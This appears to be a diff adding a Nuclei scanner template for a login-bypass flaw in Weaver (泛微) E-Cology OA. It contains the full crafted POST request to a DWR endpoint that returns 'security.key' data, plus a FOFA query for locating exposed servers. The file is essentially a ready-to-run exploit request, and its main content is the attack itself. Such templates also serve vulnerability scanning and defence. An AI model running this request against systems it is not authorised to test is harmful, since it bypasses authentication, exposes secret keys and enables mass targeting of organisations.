@@ -1,0 +1,27 @@
+id: weaver-e-cology-login-bypass
+
+info:
+  name: 泛微E-Cology登录绕过
+  author: onewin
+  severity: high
+  description: |
+    泛微E-Cology OA系统存在登录绕过漏洞，攻击者可通过特定接口绕过认证获取系统敏感信息
+    [漏洞发现时间：2025年7月]
+  metadata:
+    fofa-query: app="泛微-协同办公OA"
+  tags: 泛微-EOffice,泛微-协同办公OA
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "security.key"
+        part: body
+        condition: and
